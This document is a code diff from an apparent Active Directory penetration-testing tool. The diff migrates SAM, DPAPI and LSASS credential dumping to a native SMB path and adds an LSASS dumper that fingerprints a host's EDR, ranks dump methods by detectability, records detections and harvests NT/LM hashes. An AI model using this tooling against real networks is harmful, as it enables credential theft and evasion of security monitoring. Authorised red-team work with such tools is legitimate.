-                    hosts_set = item.get("hosts")
-                    host_count = (
-                        len(
-                            [
-                                host_name
-                                for host_name in hosts_set
-                                if isinstance(host_name, str) and host_name.strip()
-                            ]
-                        )
-                        if isinstance(hosts_set, set)
-                        else 0
-                    )
-                    single_host_candidates.append(
-                        {
-                            "username": str(item.get("username") or "").strip(),
-                            "credential": str(item.get("credential") or "").strip(),
-                            "rid": str(item.get("rid") or "").strip(),
-                            "source_hosts": max(1, host_count),
-                            "source_hostnames": sorted(
-                                str(host_name).strip()
-                                for host_name in hosts_set
-                                if isinstance(host_name, str) and str(host_name).strip()
-                            ),
-                        }
-                    )
-                _run_single_host_local_admin_reuse_validation(
-                    shell,
-                    domain=domain,
-                    source_host=str(host),
-                    candidates=single_host_candidates,
-                )
-            print_success("SAM dump processing completed")
-        else:
-            error_message = errors_output.strip() if errors_output else output.strip()
+        if not _native_dump_supported(shell, host):
             print_error(
-                f"Error executing SAM dump: {error_message if error_message else 'Details not available'}"
+                "Native SAM dump cannot start because no usable native SMB credential "
+                "context is available. external-command fallback has been removed."
             )
-
+            return
+        _native_execute_dump_sam(
+            shell,
+            domain=domain,
+            host=host,
+            auth_username=auth_username,
+        )
     except Exception as e:
         telemetry.capture_exception(e)
-        print_error("Error during SAM dump.")
+        print_error("Error during native SAM dump.")
         print_exception(show_locals=False, exception=e)
 
 
@@ -3153,125 +4813,55 @@ def execute_dump_dpapi(
     host: str,
     auth_username: str | None = None,
 ) -> None:
-    """Execute DPAPI dump command, display output, and process credentials."""
+    """Execute a DPAPI dump through the native async SMB stack only."""
+    _ = (command, auth_username)
     try:
-        timeout_seconds = _resolve_dump_command_timeout(host)
-        print_info_debug(
-            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
-        )
-        completed_process = shell.run_command(command, timeout=timeout_seconds)
-        output = completed_process.stdout
-        errors_output = completed_process.stderr
-
-        if completed_process.returncode == 0:
-            auth_failure = parse_netexec_delegated_auth_failure(
-                output
-            ) or parse_netexec_delegated_auth_failure(errors_output)
-            if auth_failure:
-                print_error(
-                    "Error executing DPAPI dump: "
-                    f"{auth_failure.line}"
-                )
-                return
-            process_dpapi_output(
-                shell,
-                output=output,
-                domain=domain,
-                host=host,
-                auth_username=auth_username,
-                source_protocol="smb",
-                prompt_confirmation=True,
-            )
-            print_info("\nDPAPI dump processing completed")
-        else:
-            error_message = errors_output.strip() if errors_output else output.strip()
+        if not _native_dump_supported(shell, host):
             print_error(
-                f"Error executing DPAPI dump: {error_message if error_message else 'Details not available'}"
+                "Native DPAPI dump cannot start because no usable native SMB credential "
+                "context is available. external-command fallback has been removed."
             )
-
+            return
+        _native_execute_dump_dpapi(
+            shell,
+            domain=domain,
+            host=host,
+            auth_username=auth_username,
+        )
     except Exception as e:
         telemetry.capture_exception(e)
-        print_error("Error during DPAPI dump.")
+        print_error("Error during native DPAPI dump.")
         print_exception(show_locals=False, exception=e)
 
 
 def execute_dump_lsass(shell: Any, command: str, domain: str, host: str) -> None:
-    """Execute LSASS dump command and process the output."""
+    """Execute an LSASS dump through the native async SMB stack only."""
+    _ = command
     try:
-        completed_process = shell.run_command(command, timeout=300)
-        if completed_process.returncode != 0:
-            error_message = (
-                completed_process.stderr.strip()
-                if completed_process.stderr
-                else completed_process.stdout.strip()
-            )
+        if not _native_dump_supported(shell, host):
             print_error(
-                f"An error occurred executing the command: {error_message if error_message else 'No error details available.'}"
+                "Native LSASS dump cannot start because no usable native SMB credential "
+                "context is available. Legacy LSASS fallback has been removed."
             )
             return
-        for line in completed_process.stdout.splitlines():
-            if "[+]" in line and "Valid" in line:
-                try:
-                    clean_line = strip_ansi_codes(line)
-                    parts = clean_line.split("[+]")[1].split("Valid")[0]
-                    creds = parts.replace("[+]", "").strip()
-                    if ":" in creds:
-                        user, hash_value = creds.split(":", 1)
-                        user = user.strip()
-                        hash_value = hash_value.strip()
-                        marked_user = mark_sensitive(user, "user")
-                        print_info(f"User (after strip): '{marked_user}'")
-                        print_info(f"Hash (after strip): '{hash_value}'")
-                        shell.add_credential(domain, user, hash_value)
-                except Exception as e:
-                    telemetry.capture_exception(e)
-                    print_error(f"Error processing line: '{line.strip()}'")
-                    print_error("Error.")
-                    print_exception(show_locals=False, exception=e)
+        _native_execute_dump_lsass(
+            shell,
+            domain=domain,
+            host=host,
+        )
     except Exception as e:
         telemetry.capture_exception(e)
-        print_error("An error occurred.")
+        print_error("Error during native LSASS dump.")
         print_exception(show_locals=False, exception=e)
 
 
 def execute_dump_rest(shell: Any, command: str, domain: str, host: str) -> None:
-    """Execute generic dump command and extract credentials from output.
-
-    **LEGACY/UNUSED**: This function appears to be legacy code and is not
-    currently called from anywhere in the codebase. It's kept for backward
-    compatibility and potential future use.
-
-    Args:
-        shell: The active `PentestShell` instance (from `adscan.py`).
-        command: Full command to run.
-        domain: Target domain.
-        host: Target host.
-    """
-    try:
-        completed_process = shell.run_command(command, timeout=300)
-        output_str = completed_process.stdout
-        errors_str = completed_process.stderr
-
-        if output_str:
-            for line in output_str.splitlines():
-                shell.extract_credentials(line, domain)
-
-        if errors_str:
-            print_error(f"Errors found during execution: {errors_str.strip()}")
-
-        if completed_process.returncode != 0 and (
-            not errors_str or not errors_str.strip()
-        ):
-            # If there was a non-zero return code AND no specific errors were already printed from stderr
-            print_error(
-                f"Exploit failed or process terminated with errors. Return code: {completed_process.returncode}"
-            )
-        elif completed_process.returncode == 0:
-            print_success("Process completed successfully.")
-    except Exception as e:
-        telemetry.capture_exception(e)
-        print_error("An error occurred.")
-        print_exception(show_locals=False, exception=e)
+    """Reject generic subprocess dump execution after native migration."""
+    _ = (shell, command, domain, host)
+    print_error(
+        "Generic subprocess dump execution has been removed. "
+        "Use the native SAM, LSA, DPAPI, or LSASS dump paths."
+    )
 
 
 # ============================================================================
@@ -3336,6 +4926,32 @@ def run_dump_host(
     """Professional credential dumping with progress tracking."""
     cred_type = "Hash" if shell.is_hash(password) else "Password"
     auth_scope = "Local" if islocal.lower() == "true" else "Domain"
+
+    # --- Premium session header ---
+    try:
+        _dh_domain = str(domain or "")
+        _domains_data = getattr(shell, "domains_data", {}) or {}
+        _domain_info = (
+            _domains_data.get(_dh_domain, {}) if isinstance(_domains_data, dict) else {}
+        ) or {}
+        _dh_dc = str(_domain_info.get("pdc", "") or "")
+        _dh_user = str(username or "")
+        _dh_cred = (
+            f"{_dh_user} / {_dh_domain.upper()}"
+            if _dh_user and _dh_domain
+            else _dh_user
+        )
+        print_session_header(
+            SessionHeader(
+                workspace=str(getattr(shell, "current_workspace", "") or ""),
+                target_domain=_dh_domain,
+                dc_ip=_dh_dc,
+                credential_label=_dh_cred,
+                scan_mode="dumps",
+            )
+        )
+    except Exception:  # noqa: BLE001 - cosmetic header must never block dump
+        pass
 
     # Initialize progress tracker for credential dumping
     tracker = ScanProgressTracker(
@@ -3427,6 +5043,25 @@ def run_dump_host(
 
     # Print workflow summary
     tracker.print_summary()
+
+    # --- End-of-run loot card ---
+    try:
+        _loot_domain = str(domain or getattr(shell, "current_domain", "") or "")
+        _domains_data = getattr(shell, "domains_data", {}) or {}
+        _domain_info = (
+            _domains_data.get(_loot_domain, {})
+            if isinstance(_domains_data, dict)
+            else {}
+        ) or {}
+        _owned = list(_domain_info.get("owned_accounts", []) or [])
+        print_session_loot_card(
+            SessionLootCard(
+                domain=_loot_domain,
+                owned_accounts=_owned,
+            )
+        )
+    except Exception:  # noqa: BLE001 - loot card is cosmetic, never block exit
+        pass
 
 
 def run_do_dump_host(shell: Any, args: str) -> None:
@@ -3536,10 +5171,18 @@ def run_ask_for_dump_all_lsa(
     username: str,
     password: str,
 ) -> None:
-    """Prompt user to dump LSA credentials from all hosts in domain."""
+    """Prompt user to dump LSA credentials from all hosts in domain.
+
+    Renders the OPSEC disclosure panel first so the operator sees the
+    telemetry footprint before the confirmation prompt.
+    """
     marked_domain = mark_sensitive(domain, "domain")
+    _render_opsec_panel(
+        "lsa",
+        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
+    )
     if Confirm.ask(
-        f"Do you want to dump the LSA credentials from all hosts in domain {marked_domain}?",
+        f"  [{_AMBER}]Proceed with LSA bulk dump across {marked_domain}?[/{_AMBER}]",
         default=False,
     ):
         run_dump_lsa(
@@ -3550,6 +5193,10 @@ def run_ask_for_dump_all_lsa(
             host="All",
             islocal="false",
         )
+    else:
+        _CONSOLE.print(
+            f"  [{_MUTED}]LSA bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
+        )
 
 
 def run_ask_for_dump_all_sam(
@@ -3559,10 +5206,18 @@ def run_ask_for_dump_all_sam(
     username: str,
     password: str,
 ) -> None:
-    """Prompt user to dump SAM credentials from all hosts in domain."""
+    """Prompt user to dump SAM credentials from all hosts in domain.
+
+    Renders the OPSEC disclosure panel first so the operator sees the
+    telemetry footprint before the confirmation prompt.
+    """
     marked_domain = mark_sensitive(domain, "domain")
+    _render_opsec_panel(
+        "sam",
+        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
+    )
     if Confirm.ask(
-        f"Do you want to dump the SAM credentials from all hosts in domain {marked_domain}?",
+        f"  [{_AMBER}]Proceed with SAM bulk dump across {marked_domain}?[/{_AMBER}]",
         default=False,
     ):
         run_dump_sam(
@@ -3573,6 +5228,10 @@ def run_ask_for_dump_all_sam(
             host="All",
             islocal="false",
         )
+    else:
+        _CONSOLE.print(
+            f"  [{_MUTED}]SAM bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
+        )
 
 
 def run_ask_for_dump_all_dpapi(
@@ -3582,10 +5241,18 @@ def run_ask_for_dump_all_dpapi(
     username: str,
     password: str,
 ) -> None:
-    """Prompt user to dump DPAPI credentials from all hosts in domain."""
+    """Prompt user to dump DPAPI credentials from all hosts in domain.
+
+    Renders the OPSEC disclosure panel first so the operator sees the
+    telemetry footprint before the confirmation prompt.
+    """
     marked_domain = mark_sensitive(domain, "domain")
+    _render_opsec_panel(
+        "dpapi",
+        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
+    )
     if Confirm.ask(
-        f"Do you want to dump the DPAPI credentials from all hosts in domain {marked_domain}?",
+        f"  [{_AMBER}]Proceed with DPAPI bulk dump across {marked_domain}?[/{_AMBER}]",
         default=False,
     ):
         run_dump_dpapi(
@@ -3595,6 +5262,10 @@ def run_ask_for_dump_all_dpapi(
             password=password,
             host="All",
             islocal="false",
+        )
+    else:
+        _CONSOLE.print(
+            f"  [{_MUTED}]DPAPI bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
         )
 
 
@@ -3672,8 +5343,8 @@ def run_do_dump_lsa(shell: Any, args: str) -> None:
             - host (str): The target host or 'All' for all hosts in the domain.
             - islocal (str): Indicates if the operation is local ('true') or remote ('false').
 
-    The function dumps the LSA credentials using NetExec.
-    It supports dumping from a single host or all hosts in a specified domain.
+    The function dumps LSA credentials using the native async SMB path.
+    Bulk targets are executed by the native async batch orchestrator.
     """
     args_list = args.split()
     if len(args_list) != 5:
@@ -3775,17 +5446,209 @@ def run_ask_for_dump_lsass(
     host: str,
     islocal: str,
 ) -> None:
-    """Prompt user to dump LSASS credentials from host."""
+    """Prompt user to dump LSASS credentials from host.
+
+    LSASS is the loudest Windows telemetry surface in the dump catalog
+    (Sysmon 10, MDI/MDE \"suspicious LSASS access\", 4663 on lsass.exe).
+    We render a full OPSEC disclosure panel first, then gate on an explicit
+    host-name confirmation per tui-design Dialogs / severe-action policy.
+    """
     marked_host = mark_sensitive(host, "hostname")
-    if Confirm.ask(
-        f"[+] Do you want to dump LSASS credentials from host {marked_host}?",
-        default=False,
-    ):
-        run_dump_lsass(
-            shell,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-            islocal=islocal,
+    _render_opsec_panel("lsass", target_label=str(marked_host))
+    if _confirm_severe_lsass(str(marked_host), host):
+        workspace_dir = _native_workspace_dir(shell, domain)
+        with _temporary_dump_creds(
+            shell, domain=domain, username=username, secret=password, islocal=islocal
+        ):
+            _run_native_async(
+                run_intelligent_lsass_dump(
+                    shell, host=host, domain=domain, workspace_dir=workspace_dir
+                )
+            )
+    else:
+        _CONSOLE.print(
+            f"  [{_MUTED}]LSASS dump aborted at the OPSEC gate.[/{_MUTED}]"
         )
+
+
+async def run_intelligent_lsass_dump(
+    shell: Any,
+    host: str,
+    domain: str,
+    workspace_dir: str,
+    preferred_method: str | None = None,
+    skip_fingerprint: bool = False,
+) -> bool:
+    """Intelligent LSASS dump: fingerprint → select method → dump → catch detection.
+
+    Always fingerprints first (unless skip_fingerprint=True) so the operator sees
+    host security posture and method rationale before any dump attempt starts.
+    Returns True on success.
+    """
+    config = _build_smb_config_from_shell(shell, host, domain)
+    intel = EdrIntelligence(workspace_dir)
+
+    # Global EDR intelligence warnings from prior catches on other hosts
+    prior_warnings: list[str] = []
+    for method in _ALL_METHODS:
+        prior_warnings.extend(intel.global_warnings_for_method(method.name))
+    _render_global_edr_warnings(prior_warnings)
+
+    _CONSOLE.print(
+        f"\n[bold {_ICE}]◉  LSASS Dump[/bold {_ICE}]  [{_MUTED}]{host}[/{_MUTED}]\n"
+    )
+
+    # ── Phase 1: Fingerprint ──────────────────────────────────────────────────
+    fp: HostFingerprint | None = None
+    if not skip_fingerprint:
+        with Progress(
+            SpinnerColumn(style=_ICE),
+            TextColumn(f"[{_MUTED}]Fingerprinting {host}...[/{_MUTED}]"),
+            transient=True,
+            console=_CONSOLE,
+        ) as prog:
+            prog.add_task("")
+            fp = await HostFingerprintService().fingerprint(config)
+
+        if fp.detected_products:
+            intel.record_host_products(
+                config.target_ip,
+                [(p.name, p.category) for p in fp.detected_products],
+            )
+        if fp.error:
+            print_info_verbose(f"[lsass] fingerprint partial error: {fp.error}")
+
+        ranked = LsassMethodSelector.rank(fp, intel)
+        _render_fingerprint_panel(fp, ranked)
+
+        # Pre-dump confirmation: operator confirms method (or picks a different one).
+        chosen = _prompt_method_confirm(ranked)
+        if chosen is None:
+            return False
+        preferred_method = chosen.name if chosen != ranked[0] else preferred_method
+
+    # ── Phase 2: Dump (with live method-attempt feedback) ─────────────────────
+    attempt: list[int] = [0]
+
+    def _progress(step: str, detail: str) -> None:
+        if step == "dump":
+            attempt[0] += 1
+            label = (
+                f"[{_ICE}]⚡[/{_ICE}]" if attempt[0] == 1 else f"[{_AMBER}]↻[/{_AMBER}]"
+            )
+            _CONSOLE.print(f"  {label}  [{_MUTED}]{detail}[/{_MUTED}]")
+        elif step == "catch":
+            _CONSOLE.print(f"  [{_LAVA}]🚨  {detail}[/{_LAVA}]")
+
+    _ranked_for_gate = ranked if fp is not None else []
+    orchestrator = LsassDumpOrchestrator(scratch_dir="/tmp", progress_cb=_progress)
+    result = await orchestrator.run(
+        config=config,
+        workspace_dir=workspace_dir,
+        intel=intel,
+        preferred_method=preferred_method,
+        fp_override=fp,
+        method_failed_cb=_make_method_failed_gate(_ranked_for_gate)
+        if _ranked_for_gate
+        else None,
+    )
+
+    if result.catch_detected and result.catch_product:
+        _render_catch_alert(result.method_used, result.catch_product)
+
+    # ── Phase 3: Results ──────────────────────────────────────────────────────
+    if result.success and result.dump_result:
+        creds = result.dump_result.credentials
+        _CONSOLE.print()
+
+        display = DumpDisplay(console=_CONSOLE)
+
+        # Phase 1: display only (Live active, no console prints allowed).
+        display.start_credential_stream(
+            f"LSASS  ·  {result.method_used}  ·  {len(creds)} creds"
+        )
+        for cred in creds:
+            account = (
+                f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
+            )
+            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
+            display.stream_credential(CredentialType.LSASS, account, secret)
+        display.stop_credential_stream()
+
+        # Phase 2: persist (Live stopped, verification + TGT panels render cleanly).
+        saved = 0
+        for cred in creds:
+            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
+            if cred.username and secret:
+                try:
+                    shell.add_credential(domain or cred.domain, cred.username, secret,
+                                         credential_origin="lsass_dump")
+                    saved += 1
+                except Exception as exc:
+                    telemetry.capture_exception(exc)
+
+        # Register uploaded artifacts in the ledger and report cleanup status.
+        dr = result.dump_result
+        if dr.artifacts_cleaned or dr.artifacts_failed:
+            ledger = getattr(shell, "environment_change_ledger", None)
+            for path in (*dr.artifacts_cleaned, *dr.artifacts_failed):
+                change_id: str | None = None
+                if ledger is not None:
+                    change_id = ledger.register_change(
+                        kind="file_uploaded",
+                        domain=domain or "",
+                        target=path,
+                        detail={"host": host, "method": result.method_used},
+                        method=result.method_used,
+                    )
+                if path in dr.artifacts_cleaned:
+                    if ledger is not None and change_id:
+                        ledger.mark_reverted(change_id)
+                else:
+                    if ledger is not None and change_id:
+                        ledger.mark_failed(
+                            change_id,
+                            error=f"Delete failed; manual cleanup required on {host}",
+                            manual_cleanup_instructions=f'del "{path}" on {host}',
+                        )
+
+            total = len(dr.artifacts_cleaned) + len(dr.artifacts_failed)
+            if dr.artifacts_failed:
+                _CONSOLE.print(
+                    f"  [{_LAVA}]✗[/{_LAVA}]  [{_MUTED}]Cleanup partial:  "
+                    f"{len(dr.artifacts_cleaned)}/{total} artifacts removed  "
+                    f"·  {len(dr.artifacts_failed)} left on target[/{_MUTED}]"
+                )
+            else:
+                _CONSOLE.print(
+                    f"  [{_ACID}]✓[/{_ACID}]  [{_MUTED}]Artifacts cleaned  "
+                    f"({total}/{total})[/{_MUTED}]"
+                )
+
+        footer = RichText()
+        footer.append("  method  ", style=_MUTED)
+        footer.append(result.method_used, style=f"bold {_ACID}")
+        footer.append("    saved  ", style=_MUTED)
+        footer.append(str(saved), style=f"bold {_ACID}")
+        if result.dump_result.dump_local_path:
+            footer.append("    dump  ", style=_MUTED)
+            footer.append(result.dump_result.dump_local_path, style=_MUTED)
+        _CONSOLE.print(footer)
+        _CONSOLE.print()
+        return True
+
+    _CONSOLE.print(
+        Panel(
+            (
+                f"[bold {_LAVA}]No credentials recovered.[/bold {_LAVA}]\n"
+                f"[{_MUTED}]  Reason   [/{_MUTED}] "
+                f"[{_LAVA}]{result.error or 'All methods exhausted: no successful dump'}[/{_LAVA}]\n"
+                f"[{_MUTED}]  Next     [/{_MUTED}] "
+                f"[{_MUTED}]Try a different host, or run sam / lsa dumps which leave a smaller surface than LSASS.[/{_MUTED}]"
+            ),
+            title=f"[bold {_LAVA}]✗  LSASS Dump Failed[/bold {_LAVA}]",
+            border_style=_LAVA,
+            padding=(0, 1),
+        )
+    )
+    return False
